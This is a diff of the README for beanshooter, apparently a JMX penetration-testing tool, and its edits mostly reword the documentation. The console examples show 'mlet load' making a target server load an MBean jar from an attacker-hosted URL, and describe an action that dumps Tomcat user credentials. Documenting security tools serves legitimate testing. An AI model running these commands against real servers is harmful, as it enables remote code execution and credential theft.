@@ -650,12 +650,12 @@ The `download` action can be used to download a file from the *JMX* server:
 ---
 
 The *MLetMBean* is a well known *MBean* that can be used for loading additional *MBeans* over the
-network. It is already implicitly used by *beanshooter* `deploy` action, but can also be invoked
+network. It is already implicitly used by *beanshooters* `deploy` action, but can also be invoked
 manually using the `mlet` operation.
 
 #### MLet Load
 
-The currently only implemented *MLet* operation is the `load` operation that can be used to load
+The currently only implemented *MLet* method is the `load` operation that can be used to load
 an *MBean* class from a user specified *URL*:
 
 ```console
@@ -688,12 +688,12 @@ an *MBean* class from a user specified *URL*:
 [+] MBean was loaded successfully.
 ```
 
-The example above demonstrates how the *TonkaBean* can be loaded using the `mlet` operation. If you want
-to load a custom *MBean*, you need to specify `custom` instead of `tonka` and supply the `--class-name`,
-`--object-name` and `--jar-file` options:
+The example above demonstrates how the *TonkaBean* can be manually loaded using the `mlet` operation. If
+you want to load a custom *MBean* instead, you need to specify the keyword `custom` instead of `tonka` and supply
+the `--class-name`, `--object-name` and `--jar-file` options:
 
 ```console
-[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.tonkabean.TonkaBean --object-name MLetTonkaBean:name=TonkaBean,id=2 --jar-file www/tonka-bean.jar
+[qtc@devbox ~]$ beanshooter mlet load 172.17.0.2 9010 custom http://172.17.0.1:8000 --class-name de.qtc.beanshooter.ExampleBean --object-name ExampleBean:name=ExampleBean,id=1 --jar-file www/example.jar
 [+] Starting MBean deployment.
 [+] ...
 [+] MBean was loaded successfully.
@@ -709,7 +709,7 @@ accounts that are available on a *tomcat* service.
 
 #### Tomcat List
 
-The currently only implemented operation is `list`, which lists available user accounts:
+The currently only implemented operation is `list`, which lists available user accounts, their associated roles and credentials:
 
 ```console
 [qtc@devbox ~]$ beanshooter tomcat list 172.17.0.2 1090
@@ -776,15 +776,16 @@ the client to connect with a specific *SASL Profile*. Available profiles for *be
 * ntlm
 * gssapi
 
-Each of them can optionally paired with *TLS* by using the `--ssl` option. When using the `enum` action on a *SASL* protected
+Each of them can optionally be paired with *TLS* by using the `--ssl` option. When using the `enum` action on a *SASL* protected
 *JMXMP* endpoint, *beanshooter* attempts to enumerate the required *SASL* profile. Whereas determining the required *SASL*
-mechanism is usually possible, the required *TLS* setting cannot be obtained:
+mechanism is usually possible, the required *TLS* setting cannot be enumerated:
 
 ```console
 [qtc@devbox ~]$ beanshooter enum 172.17.0.2 4449 --jmxmp
 [+] Checking servers SASL configuration:
 [+]
 [+] 	- Remote JMXMP server uses SASL/NTLM SASL profile.
+[+] 	  Notice: TLS setting cannot be enumerated and --ssl may be required.
 [+] 	  Vulnerability Status: Non Vulnerable
 [+]
 [+] Checking pre-auth deserialization behavior:
